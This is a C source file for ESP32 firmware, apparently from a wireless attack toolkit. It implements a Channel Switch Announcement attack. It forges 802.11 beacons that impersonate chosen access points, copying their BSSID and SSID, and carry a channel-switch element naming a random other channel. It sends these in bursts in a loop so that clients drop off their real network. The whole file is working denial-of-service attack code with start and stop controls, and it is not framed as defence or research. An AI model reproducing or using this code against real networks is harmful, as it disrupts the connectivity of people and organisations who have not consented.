#include "attacks/wifi/channel_switch_attack.h"
#include "managers/wifi_manager.h"
#include "managers/ap_manager.h"
#include "managers/rgb_manager.h"
#include "managers/status_display_manager.h"
#include "scans/wifi/ap_scan.h"
#include "core/glog.h"
#include "core/system_manager.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <string.h>
#include <inttypes.h>

#include "core/network_constants.h"

extern RGBManager_t rgb_manager;

static uint32_t csa_packets_sent = 0;
static TaskHandle_t csa_task_handle = NULL;
static volatile bool csa_stop_requested = false;

static uint8_t get_different_channel(int ap_channel) {
    uint8_t new_channel;
    do {
#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
        new_channel = 1 + (esp_random() % 13);
#else
        new_channel = 1 + (esp_random() % MAX_WIFI_CHANNEL);
#endif
    } while (new_channel == ap_channel);
    return new_channel;
}

static void build_csa_beacon(uint8_t *beacon, size_t *beacon_len, 
                              uint8_t *bssid, uint8_t *ssid, uint8_t ssid_len, 
                              uint8_t ap_channel, uint8_t new_channel, uint16_t seq_num) {
    uint8_t *ptr = beacon;
    
    *ptr++ = 0x80; *ptr++ = 0x00;
    *ptr++ = 0x00; *ptr++ = 0x00;
    memset(ptr, 0xFF, 6); ptr += 6;
    memcpy(ptr, bssid, 6); ptr += 6;
    memcpy(ptr, bssid, 6); ptr += 6;
    *ptr++ = seq_num & 0xFF;
    *ptr++ = (seq_num >> 8) & 0xFF;
    
    uint64_t ts = esp_timer_get_time();
    memcpy(ptr, &ts, 8); ptr += 8;
    *ptr++ = 0x64; *ptr++ = 0x00;
    *ptr++ = 0x01; *ptr++ = 0x00;
    
    *ptr++ = 0x00;
    *ptr++ = ssid_len;
    memcpy(ptr, ssid, ssid_len); ptr += ssid_len;
    
    uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    memcpy(ptr, rates, sizeof(rates)); ptr += sizeof(rates);
    
    *ptr++ = 0x03;
    *ptr++ = 0x01;
    *ptr++ = ap_channel;
    
    *ptr++ = 0x25;
    *ptr++ = 0x03;
    *ptr++ = 0x01;
    *ptr++ = new_channel;
    *ptr++ = 0x03;
    
    *beacon_len = ptr - beacon;
}

static void csa_attack_task(void *param) {
    wifi_ap_record_t *selected_aps;
    int selected_ap_count;
    ap_scan_get_selected(&selected_aps, &selected_ap_count);
    
    char sanitized_ssid[33];
    uint32_t last_log = 0;
    uint16_t seq_num = 0;
    uint8_t beacon_buf[300];
    size_t beacon_len;
    
    glog("CSA Attack: Targeting %d AP(s)\n", selected_ap_count);
    
    for (int i = 0; i < selected_ap_count; i++) {
        char *ssid = (char *)selected_aps[i].ssid;
        if (strlen(ssid) == 0) {
            snprintf(sanitized_ssid, sizeof(sanitized_ssid), "[Hidden]");
        } else {
            snprintf(sanitized_ssid, sizeof(sanitized_ssid), "%s", ssid);
        }
        glog("  [%d] %s (Ch:%d) %02X:%02X:%02X:%02X:%02X:%02X\n",
             i, sanitized_ssid, selected_aps[i].primary,
             selected_aps[i].bssid[0], selected_aps[i].bssid[1],
             selected_aps[i].bssid[2], selected_aps[i].bssid[3],
             selected_aps[i].bssid[4], selected_aps[i].bssid[5]);
    }
    
    while (!csa_stop_requested) {
        for (int i = 0; i < selected_ap_count && !csa_stop_requested; i++) {
            int ap_channel = selected_aps[i].primary;
            if (ap_channel < 1 || ap_channel > MAX_WIFI_CHANNEL) {
                ap_channel = 1;
            }
            
            uint8_t new_channel = get_different_channel(ap_channel);
            
            wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
            esp_wifi_set_channel(ap_channel, second);
            vTaskDelay(pdMS_TO_TICKS(1));
            
            uint8_t ssid_len = strnlen((char *)selected_aps[i].ssid, 32);
            
            for (int burst = 0; burst < 5 && !csa_stop_requested; burst++) {
                build_csa_beacon(beacon_buf, &beacon_len,
                                selected_aps[i].bssid,
                                selected_aps[i].ssid, ssid_len,
                                ap_channel, new_channel, seq_num++);
                
                esp_wifi_80211_tx(ap_manager_get_tx_iface(), beacon_buf, beacon_len, false);
                csa_packets_sent++;
                
                vTaskDelay(pdMS_TO_TICKS(2));
            }
            
            esp_wifi_set_channel(new_channel, second);
        }
        
        vTaskDelay(pdMS_TO_TICKS(100));
        
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log >= 5000) {
            glog("CSA: %" PRIu32 " pkts/sec\n", csa_packets_sent / 5);
            csa_packets_sent = 0;
            last_log = now;
        }
    }
    
    csa_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

void channel_switch_attack_start(void) {
    if (csa_task_handle != NULL) {
        glog("CSA Attack already running.\n");
        return;
    }

    wifi_ap_record_t *selected_aps;
    int selected_ap_count;
    ap_scan_get_selected(&selected_aps, &selected_ap_count);
    
    if (selected_ap_count == 0 || selected_aps == NULL) {
        glog("No APs selected. Please select AP(s) first using 'select -a <index>'.\n");
        status_display_show_status("CSA: No APs");
        return;
    }

    ap_manager_stop_services();
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    // Attack radio profile: STA-only mode (GhostNet AP off, clients kicked)
    // + wide/LR protocols for unrestricted channel hopping and raw TX
    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());

    glog("Starting Channel Switch Attack on %d AP(s)...\n", selected_ap_count);
    status_display_show_status("CSA Attack Start");
    
    csa_stop_requested = false;
    csa_packets_sent = 0;
    
    BaseType_t rc = xTaskCreate_psram(csa_attack_task, "csa_attack", 3072, NULL, 5, &csa_task_handle);
    if (rc != pdPASS) {
        glog("Failed to start CSA attack task (%ld)\n", (long)rc);
        status_display_show_status("CSA Start Fail");
        csa_task_handle = NULL;
        csa_stop_requested = false;
        (void)ap_manager_restore_after_attack("csa start");
        return;
    }
    rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
}

void channel_switch_attack_stop(void) {
    if (csa_task_handle != NULL) {
        glog("Stopping CSA attack...\n");
        status_display_show_status("CSA Stopping");
        
        csa_stop_requested = true;
        
        int wait_count = 0;
        while (csa_task_handle != NULL && wait_count < 100) {
            vTaskDelay(pdMS_TO_TICKS(10));
            wait_count++;
        }
        
        if (csa_task_handle != NULL) {
            vTaskDeleteWithCaps(csa_task_handle);
            csa_task_handle = NULL;
        }
        
        csa_stop_requested = false;
        rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
        esp_wifi_stop();
        (void)ap_manager_restore_after_attack("csa stop");
        status_display_show_status("CSA Stopped");
    } else {
        status_display_show_status("No CSA Active");
    }
}

bool channel_switch_attack_is_running(void) {
    return csa_task_handle != NULL;
}

uint32_t channel_switch_attack_get_packets_sent(void) {
    return csa_packets_sent;
}

void channel_switch_attack_reset_packet_counter(void) {
    csa_packets_sent = 0;
}
